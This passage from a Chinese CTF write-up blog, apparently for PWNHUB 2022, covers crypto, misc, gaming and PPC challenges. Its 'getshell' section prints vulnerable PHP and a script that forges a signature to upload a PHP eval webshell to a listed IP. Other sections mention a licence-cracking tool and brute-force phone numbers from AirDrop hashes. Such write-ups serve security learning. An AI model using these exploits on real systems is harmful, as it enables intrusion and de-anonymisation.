0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + 